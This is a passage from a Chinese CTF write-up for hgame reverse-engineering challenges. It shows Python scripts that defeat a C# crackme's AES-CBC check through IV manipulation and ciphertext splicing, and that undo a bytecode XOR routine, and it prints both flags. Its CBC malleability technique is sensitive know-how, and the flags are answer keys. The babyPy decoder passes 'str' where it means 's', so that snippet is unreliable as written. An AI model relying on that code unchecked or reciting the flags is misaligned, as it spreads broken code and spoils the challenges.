					MessageBox.Show("注册失败！\nhint: " + aes2.DecryptFromBase64String("mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="));
				}
			}
			catch
			{
				MessageBox.Show("注册失败！");
			}
		}
```

发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。

对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果

对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。

不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。

直接python解决：

```python
from Crypto.Cipher import AES
import base64


# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文
class AesCrypter(object):
    def __init__(self, key, iv):
        self.key = key
        self.iv = iv

    def pkcs7padding(self, text):
        bs = AES.block_size  # 16

        length = len(text)
        bytes_length = len(bytes(text, encoding='utf-8'))
        padding_size = length if (bytes_length == length) else bytes_length
        padding = bs - padding_size % bs
        padding_text = chr(padding) * padding
        return text + padding_text

    def pkcs7unpadding(self, text):
        length = len(text)
        unpadding = ord(text[length - 1])
        return text[0:length - unpadding]

    def encrypt(self, content):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.pkcs7padding(content)
        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8'))
        result = base64.b64encode(aes_encode_bytes).decode(encoding='utf-8')
        return result

    def decrypt(self, content):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        # base64解码
        aes_encode_bytes = base64.b64decode(content)
        # 解密
        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)
        # 重新编码
        result = aes_decode_bytes.decode(encoding='utf-8')
        # 去除填充内容
        result = self.pkcs7unpadding(result)
        if result == None:
            return ""
        else:
            return result


key = base64.b64decode("SGc0bTNfMm8yMF9XZWVLMg==")
fakeIV = base64.b64decode('MFB1T2g5SWxYMDU0SWN0cw==')
plainText = "Same_ciphertext_"
ciperText = "mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I="

aesCipher = AesCrypter(key, fakeIV)

fakePlainText = aesCipher.decrypt(ciperText)
# print(fakePlainText)
IV = ''
for i in range(16):
    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))
# print("IV : " + IV)
# /TyXYzPnY;$)\we_
IV = base64.b64encode(IV.encode('utf-8')).decode('utf-8')

cipherText2 = aesCipher.encrypt(plainText)
cipherText2 = base64.b64decode(cipherText2).hex()[:32]
cipherText3 = 'dJntSWSPWbWocAq4yjBP5Q=='
cipherText3 = base64.b64decode(cipherText3).hex()[:32]
# print(cipherText2 + cipherText3)
cipherText4 = bytes.fromhex(cipherText2 + cipherText3)
cipherText4 = base64.b64encode(cipherText4)
# print(cipherText4)
plainText3 = aesCipher.decrypt(cipherText4)
# print(plainText3)
# Same_ciphertext_DiFfer3Nt_w0r1d
flag = ''
flag += 'hgame{' + IV + plainText3[16:] + '}'
print(flag)
# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}
```

最终的flag

```
hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}
```

#### babyPy

这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来

dis指令表见https://docs.python.org/3/library/dis.html#python-bytecode-instructions

还原出来的函数原型（想打死命名的人）

```python
def encrypt(OOo):
 O0O = OOo[::-1]
 O0o = list(O0O)
 for O0 in range(1, len(O0o)):
 	Oo = O0o[O0-1] ^ O0o[O0]
 	O0o[O0] = Oo
 O = bytes(O0o)
 return O.hex()
```

所以只需要反过来异或一遍就可以了

```python
s = bytes.fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')
c = list(str)
for i in range(len(c) - 1, 0, -1):
    c[i] ^= c[i - 1]
print(bytes(c[::-1]))
```

输出flag

```
hgame{sT4cK_1$_sO_e@Sy~~}
```

